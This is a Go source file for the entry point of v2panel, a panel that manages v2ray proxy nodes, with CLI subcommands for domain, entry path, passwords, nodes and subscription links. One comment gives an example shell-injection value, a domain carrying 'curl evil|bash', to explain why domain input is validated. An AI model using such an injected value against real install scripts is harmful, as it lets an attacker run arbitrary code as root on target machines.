// v2panel 面板端入口。
//
// 与 work-v/cmd/master 的关键差异 (不要照抄 work-v, 会编译不过):
//
//	① SetCallbacks 是 **三个** 参数: 流量 / 清单 / 能力。work-v 只有两个。
//	② 没有 StartQuotaWatchdog / EnsureAllNodesInbounds, 取而代之是
//	   StartCollector() (内部自带 30s 离线判定 / 3min 清单广播 / 60s 配额巡检)
//	   与 EnsureDefaultUser() (订阅必须有账号载体)。
//	③ 静态资源来自独立的 web 包 (go:embed 不能跨目录, 路由在 internal/panel)。
//	④ 域名设置键是 panel_domain, 不是 master_domain。
//
// 子命令全部是「写完就 os.Exit(0)」的纯 CLI 动作。历史实现漏了 exit 的后果很严重:
// 面板已在运行时第二个实例抢 9000 端口失败并以 1 退出, 而启动脚本若带 set -e,
// 后面的重启步骤就全被跳过; 若面板没在运行, 命令会永久挂在前台 HTTP 服务上。
package main

import (
	"flag"
	"fmt"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"v2panel/internal/panel"
	"v2panel/web"

	"golang.org/x/crypto/bcrypt"
)

// Version 面板版本号, 也是 agent 侧版本对齐的参考值。
const Version = "1.0.0"

// panelHostRe 校验面板域名/地址的字符集。
//
// 这个值会被写进**免鉴权**的 /install.sh 与 /sub 链接 (前者由目标机 root 执行),
// 因此必须杜绝引号/分号/反引号/$ 等 shell 元字符 —— 否则构造
// `-domain 'a.com";curl evil|bash;#'` 就能把任意命令注入到安装脚本里。
var panelHostRe = regexp.MustCompile(`^[A-Za-z0-9.-]+(:[0-9]{1,5})?$`)

// detectLocalIP 返回本机第一个可用的对外 IPv4。
//
// 纯 IP 模式 (没配 panel_domain) 下用它打印「可以直接复制到别的机器上执行」的纳管命令。
// 历史实现硬编码 127.0.0.1, 于是命令行输出的命令在别的机器上根本连不上。
func detectLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, a := range addrs {
		ipNet, ok := a.(*net.IPNet)
		if !ok || ipNet.IP.IsLoopback() || ipNet.IP.To4() == nil {
			continue
		}
		return ipNet.IP.String()
	}
	return "127.0.0.1"
}

// listenAddr 组装监听地址: bind 为空 => ":port" (所有网卡); 否则 "bind:port"。
func listenAddr(bind string, port int) string {
	if bind == "" {
		return fmt.Sprintf(":%d", port)
	}
	return fmt.Sprintf("%s:%d", bind, port)
}

// baseURL 返回面板的对外基地址 (不带结尾斜杠), 供 CLI 打印链接使用。
func baseURL(port int) string {
	if d := strings.TrimSpace(panel.GetSetting("panel_domain", "")); d != "" {
		if strings.HasPrefix(d, "http://") || strings.HasPrefix(d, "https://") {
			return strings.TrimRight(d, "/")
		}
		return "https://" + strings.TrimRight(d, "/")
	}
	return fmt.Sprintf("http://%s:%d", detectLocalIP(), port)
}

func main() {
	port := flag.Int("port", 9000, "Web 服务监听端口")
	bindAddr := flag.String("bind", "127.0.0.1", "监听地址: 留空=所有网卡; 默认 127.0.0.1 只允许本机/反向代理访问 (配合宝塔 HTTPS 反代)")
	dbPath := flag.String("db", "data/v2panel.db", "SQLite 数据库路径")
	jwtSecret := flag.String("jwt-secret", "", "自定义 JWT 密钥 (留空则用库里的, 首次自动生成)")
	domainFlag := flag.String("domain", "", "配置面板外网域名 (例如 vp.example.com; 传 none/clear 清除, 恢复纯 IP 模式)")
	showEntry := flag.Bool("entry", false, "查看当前安全入口与管理员访问地址")
	setEntry := flag.String("set-entry", "", "修改安全入口路径 (如 /my_secret)")
	disableEntry := flag.Bool("disable-entry", false, "关闭安全入口拦截")
	resetAdmin := flag.Bool("reset-admin", false, "重置管理员密码为默认值 "+panel.DefaultAdminPass)
	setPass := flag.String("set-password", "", "修改管理员密码为指定值")
	listNodes := flag.Bool("nodes", false, "查看所有纳管节点与其上的节点实例")
	addNode := flag.String("add-node", "", "添加新节点并打印一键纳管命令 (参数为节点名称)")
	showURLs := flag.Bool("url", false, "查看所有订阅账号的订阅链接与节点链接")
	showVer := flag.Bool("version", false, "打印版本号")
	flag.Parse()

	if *showVer {
		fmt.Printf("v2panel %s\n", Version)
		os.Exit(0)
	}

	// ⚠️ 相对路径的 -db 是个陷阱: 所有子命令 (-entry / -nodes / -url / -set-password …)
	// 都会先 InitDB, 而 InitDB 见到库不存在就**新建一个空库并生成新的安全入口**。
	// 于是 `cd /tmp && v2panel -entry` 会安静地打印一个和线上完全无关的入口,
	// 让人以为入口被改了 —— 实际只是读错了库。踩过一次。
	// 这里在「路径是相对的 且 该文件不存在」时直接报错, 把静默的错变成明确的失败。
	if !filepath.IsAbs(*dbPath) {
		if _, err := os.Stat(*dbPath); os.IsNotExist(err) {
			log.Fatalf("[v2panel] 数据库不存在: %s\n"+
				"        这是相对路径, 会按当前工作目录解析 —— 你多半在错误的目录下执行的。\n"+
				"        请改用绝对路径, 例如:\n"+
				"          v2panel -db /opt/v2panel/data/v2panel.db %s",
				*dbPath, strings.Join(os.Args[1:], " "))
		}
	}

	// 1. 初始化数据库 (内含建表、密钥生成、默认管理员、安全入口初始化)。
	if _, err := panel.InitDB(*dbPath); err != nil {
		log.Fatalf("[v2panel] 初始化数据库失败: %v", err)
	}

	// 2. -domain: 纯配置动作, 写完立刻退出。
	if *domainFlag != "" {
		d := strings.TrimSpace(*domainFlag)
		if d == "none" || d == "clear" || d == "reset" {
			_ = panel.SetSetting("panel_domain", "")
			log.Printf("[v2panel] 面板域名已清除, 恢复为纯 IP 直连模式")
		} else {
			d = strings.TrimPrefix(d, "http://")
			d = strings.TrimPrefix(d, "https://")
			d = strings.TrimRight(d, "/")
			if !panelHostRe.MatchString(d) {
				log.Fatalf("[v2panel] 域名格式不合法: %q (只允许字母/数字/点/横线, 可带端口)", d)
			}
			_ = panel.SetSetting("panel_domain", d)
			log.Printf("[v2panel] 面板域名已配置为: https://%s", d)
		}
		os.Exit(0)
	}

	// 3. -entry: 打印安全入口与凭据。
	if *showEntry {
		entryEnabled, safePath := panel.GetSafeEntryConfig()
		if !entryEnabled {
			safePath = ""
		}
		var admin panel.Admin
		panel.DB.First(&admin)
		d := panel.GetSetting("panel_domain", "")

		fmt.Println("==================================================")
		fmt.Println("        v2panel 控制台安全入口与凭据信息          ")
		fmt.Println("==================================================")
		if entryEnabled {
			fmt.Printf("• 安全入口路径: %s\n", safePath)
		} else {
			fmt.Println("• 安全入口路径: 已关闭 (任何人可直接访问根路径 /)")
		}
		if d != "" {
			// panel_domain 库里存的是带 scheme 的完整 URL (安装脚本写的是 https://xxx)。
			// 早期这里无条件加 "https://" 前缀, 配上 https:// 的库值就成了
			// "https://https://xxx" —— 打印出来像个 bug, 用户会以为配错了。
			host := d
			for _, p := range []string{"https://", "http://"} {
				host = strings.TrimPrefix(host, p)
			}
			host = strings.TrimRight(host, "/")
			scheme := "https"
			if strings.HasPrefix(d, "http://") {
				scheme = "http"
			}
			fmt.Printf("• 域名外网入口: %s://%s%s\n", scheme, host, safePath)
			fmt.Printf("• 本机回环入口: http://127.0.0.1:%d%s\n", *port, safePath)
		} else {
			fmt.Printf("• 控制台外网入口: http://<服务器公网IP>:%d%s\n", *port, safePath)
			fmt.Printf("• 本机内网入口:   http://%s:%d%s\n", detectLocalIP(), *port, safePath)
			fmt.Printf("• 本机回环入口:   http://127.0.0.1:%d%s\n", *port, safePath)
		}
		fmt.Printf("• 默认管理账号: %s\n", admin.Username)
		fmt.Println("• 绑定域名: v2panel -domain <你的域名>   (清除: v2panel -domain none)")
		fmt.Println("• 修改入口: v2panel -set-entry /new_path   (关闭: v2panel -disable-entry)")
		fmt.Println("• 修改密码: v2panel -set-password <新密码>   (重置: v2panel -reset-admin)")
		fmt.Println("==================================================")
		os.Exit(0)
	}

	// 3.1 -set-entry
	if *setEntry != "" {
		newPath := strings.TrimSpace(*setEntry)
		if !strings.HasPrefix(newPath, "/") {
			newPath = "/" + newPath
		}
		if err := panel.ValidateSafePath(newPath); err != nil {
			fmt.Printf("❌ 安全入口路径不合法: %v\n", err)
			os.Exit(1)
		}
		// 必须走 SetSetting (upsert) 而不是 DB.Save: safe_path 的 updated_at 若写成
		// 零值会让该行之后无法被 GORM 扫描, 读取时静默回落默认值。
		if err := panel.SetSetting("safe_path", newPath); err != nil {
			fmt.Printf("❌ 保存安全入口失败: %v\n", err)
			os.Exit(1)
		}
		_ = panel.SetSetting("safe_entry_enabled", "1")
		fmt.Println("==================================================")
		fmt.Printf("✅ 安全入口已更新为: %s\n", newPath)
		fmt.Printf("外网访问地址: %s%s\n", baseURL(*port), newPath)
		fmt.Println("==================================================")
		os.Exit(0)
	}

	// 3.2 -disable-entry
	if *disableEntry {
		// 用显式开关关闭。不能只把 safe_path 置空 —— 空值无法与「从未配置」区分,
		// 重启后会被默认值重新打开 (这正是过去一重启就失效的原因)。
		_ = panel.SetSetting("safe_entry_enabled", "0")
		fmt.Println("==================================================")
		fmt.Printf("✅ 安全入口已关闭! 当前可直接通过 %s/ 访问面板\n", baseURL(*port))
		fmt.Println("==================================================")
		os.Exit(0)
	}

	// 4. -reset-admin
	if *resetAdmin {
		hash, err := bcrypt.GenerateFromPassword([]byte(panel.DefaultAdminPass), bcrypt.DefaultCost)
		if err != nil {
			fmt.Printf("❌ 密码哈希失败: %v\n", err)
			os.Exit(1)
		}
		res := panel.DB.Model(&panel.Admin{}).Where("username = ?", panel.DefaultAdminUser).Update("password_hash", string(hash))
		if res.Error != nil || res.RowsAffected == 0 {
			fmt.Println("❌ 未找到 admin 管理员记录, 重置失败")
			os.Exit(1)
		}
		fmt.Println("==================================================")
		fmt.Printf("✅ 管理员密码已重置为: %s\n", panel.DefaultAdminPass)
		fmt.Println("==================================================")
		os.Exit(0)
	}

	// 4.1 -set-password
	if *setPass != "" {
		pwd := strings.TrimSpace(*setPass)
		if len(pwd) < 8 {
			fmt.Println("❌ 密码长度不能少于 8 位")
			os.Exit(1)
		}
		hash, err := bcrypt.GenerateFromPassword([]byte(pwd), bcrypt.DefaultCost)
		if err != nil {
			fmt.Printf("❌ 密码哈希失败: %v\n", err)
			os.Exit(1)
		}
		res := panel.DB.Model(&panel.Admin{}).Where("username = ?", panel.DefaultAdminUser).Update("password_hash", string(hash))
		if res.Error != nil || res.RowsAffected == 0 {
			fmt.Println("❌ 未找到 admin 管理员记录, 修改失败")
			os.Exit(1)
		}
		fmt.Println("==================================================")
		fmt.Println("✅ 管理员密码已成功修改 (出于安全考虑不回显明文)")
		os.Exit(0)
	}

	// 5. -nodes
	if *listNodes {
		var nodes []panel.Node
		panel.DB.Order("id asc").Find(&nodes)
		fmt.Println("==========================================================================================")
		fmt.Printf("%-4s %-16s %-10s %-18s %-10s %-8s %-20s\n", "ID", "节点名称", "状态", "IP/地址", "节点实例", "CPU", "最后活跃")
		fmt.Println("------------------------------------------------------------------------------------------")
		if len(nodes) == 0 {
			fmt.Println("暂无纳管节点。使用 v2panel -add-node <名称> 添加, 或在面板上「一键安装」。")
		} else {
			for _, n := range nodes {
				statusStr := "🔴 离线"
				if n.Status == "online" {
					statusStr = "🟢 在线"
				}
				lastSeen := "从未连接"
				if n.LastSeenAt != nil {
					lastSeen = n.LastSeenAt.Format("2006-01-02 15:04:05")
				}
				var cnt int64
				panel.DB.Model(&panel.Inbound{}).Where("node_id = ?", n.ID).Count(&cnt)
				fmt.Printf("%-4d %-16s %-10s %-18s %-10d %-8s %-20s\n",
					n.ID, n.Name, statusStr, n.Address, cnt, fmt.Sprintf("%.1f%%", n.CPUPercent), lastSeen)
			}
		}
		fmt.Println("==========================================================================================")
		os.Exit(0)
	}

	// 6. -add-node
	if *addNode != "" {
		name := strings.TrimSpace(*addNode)
		if name == "" {
			fmt.Println("❌ 节点名称不能为空")
			os.Exit(1)
		}
		token := panel.NewToken()
		node := panel.Node{Name: name, Token: token, Address: "127.0.0.1", Rate: 1.0, Status: "offline"}
		if err := panel.DB.Create(&node).Error; err != nil {
			fmt.Printf("❌ 创建节点失败: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("==========================================================================================")
		fmt.Printf("✅ 节点【%s】创建成功 (Node ID: %d)\n", name, node.ID)
		fmt.Printf("• 节点专属 Token: %s\n", token)
		fmt.Println("• 在目标服务器终端执行以下命令即可自动安装 233boy 并接入面板:")
		fmt.Println("------------------------------------------------------------------------------------------")
		fmt.Printf("curl -fsSL %s/install.sh?token=%s | bash\n", baseURL(*port), token)
		fmt.Println("==========================================================================================")
		os.Exit(0)
	}

	// 7. -url: 打印订阅账号的订阅链接与各节点直连链接。
	if *showURLs {
		var users []panel.User
		panel.DB.Order("id asc").Find(&users)
		base := baseURL(*port)
		links, warns := panel.CollectSubLinks()

		fmt.Println("==========================================================================================")
		fmt.Println("                    v2panel 客户端订阅与节点直连链接全景")
		fmt.Println("==========================================================================================")
		if len(links) == 0 {
			fmt.Println("当前没有任何可用的节点链接。请先纳管节点并等待 agent 上报清单 (v2panel -nodes 查看)。")
		} else {
			cur := ""
			for _, l := range links {
				if l.NodeName != cur {
					cur = l.NodeName
					fmt.Printf("\n【节点: %s】\n", cur)
				}
				fmt.Printf("  • %-24s [%s:%d / %s]\n", l.Name, l.Address, l.Port, l.PortType)
				fmt.Printf("    %s\n", l.Link)
			}
		}
		if len(warns) > 0 {
			fmt.Println("\n[采集告警]")
			for _, w := range warns {
				fmt.Printf("  ! %s\n", w)
			}
		}

		fmt.Println("\n【订阅账号】")
		if len(users) == 0 {
			fmt.Println("  暂无账号 (启动面板后会自动创建一个默认账号)")
		}
		for _, u := range users {
			pwd := u.Password
			if pwd == "" && len(u.UUID) >= 8 {
				pwd = u.UUID[:8]
			}
			limit := "不限"
			if u.TrafficLimit > 0 {
				limit = panel.HumanBytes(u.TrafficLimit)
			}
			expire := "永久"
			if u.ExpireAt > 0 {
				expire = time.Unix(u.ExpireAt, 0).Format("2006-01-02")
			}
			fmt.Printf("  • %s (状态 %s, 已用 %s / %s, 到期 %s)\n",
				u.Username, u.Status, panel.HumanBytes(u.UsedTraffic), limit, expire)
			fmt.Printf("    门户/自适应订阅: %s/sub/%s?pwd=%s\n", base, u.SubToken, pwd)
			fmt.Printf("    标准订阅(客户端 Basic Auth): %s/sub/%s\n", base, u.SubToken)
		}
		fmt.Println("==========================================================================================")
		os.Exit(0)
	}

	// ------------------------------------------------------------------ 常驻服务
	log.Printf("==================================================")
	log.Printf("        v2panel %s  (233boy/v2ray 订阅管理面板)", Version)
	log.Printf("==================================================")

	// JWT 密钥: 命令行显式指定则落库 (便于多实例/迁移), 否则读库。
	if *jwtSecret != "" {
		panel.SetJWTSecret(*jwtSecret)
		_ = panel.SetSetting("jwt_secret", *jwtSecret)
	} else {
		panel.SetJWTSecret(panel.GetSetting("jwt_secret", ""))
	}

	// 安全入口: 显式开关, 保证 -disable-entry 重启后依然生效。
	if safeEnabled, safePathCfg := panel.GetSafeEntryConfig(); safeEnabled {
		panel.SetSafePath(safePathCfg)
		log.Printf("[v2panel 安全防护] 安全入口已启用: %s%s", baseURL(*port), safePathCfg)
		log.Printf("[v2panel 安全防护] 未授权访问将展示拦截页; 用 \"v2panel -entry\" 查看入口地址")
	} else {
		panel.SetSafePath("")
		log.Printf("[v2panel 安全防护] 安全入口拦截已关闭 (safe_entry_enabled=0)")
	}

	// Hub 回调: 流量记账 / 整机清单落库 / 能力上报 / **按用户流量记账**。
	//
	// 最后一个 (RecordUserTraffic) 是「真限流」的入账端: 它累加 V2Ray 的
	// per-user 计数器到 User.UsedTraffic, 然后触发配额判定。
	// 老 agent 不会发 user_traffic_report, 那时这个回调永远不会被调用 ——
	// 面板因此能同时兼容新旧 agent, 不需要版本判断。
	panel.GlobalHub.SetCallbacks(
		panel.RecordTraffic,
		panel.HandleInventory,
		panel.HandleCapability,
		panel.RecordUserTraffic,
	)

	// 后台采集器: 30s 离线判定 + 3min 清单广播 + 60s 配额巡检 (含启动 2s 后的一次全量拉取)。
	panel.StartCollector()

	// 流量周期重置 + 配额定期判定 (真限流的时间维度)。
	panel.StartUserSyncScheduler()

	// 订阅必须有账号载体 (UUID 是客户端鉴权凭据); 空库时自动建默认账号。
	if u, err := panel.EnsureDefaultUser(); err != nil {
		log.Printf("[v2panel] 初始化默认订阅账号失败: %v", err)
	} else {
		log.Printf("[v2panel] 默认订阅账号: %s (订阅路径 /sub/%s)", u.Username, u.SubToken)
	}

	// 前端静态资源: 独立 web 包 (go:embed 不能跨目录)。
	subFS, err := fs.Sub(web.Static, "static")
	var httpFS http.FileSystem
	if err != nil {
		log.Printf("[v2panel] 前端资源加载失败 (面板将只提供 API): %v", err)
	} else {
		httpFS = http.FS(subFS)
	}

	r := panel.SetupRouter(httpFS)

	addr := listenAddr(*bindAddr, *port)
	log.Printf("[v2panel] 服务启动监听: %s (Web 控制台 & Agent 反向连接点)", addr)
	if *bindAddr != "" && *bindAddr != "127.0.0.1" && *bindAddr != "::1" {
		log.Printf("[v2panel] 提示: 当前监听 %s, 若前面有 TLS 反向代理建议改为 -bind 127.0.0.1", *bindAddr)
	}
	if err := r.Run(addr); err != nil {
		log.Fatalf("[v2panel] 服务启动失败: %v", err)
	}
}
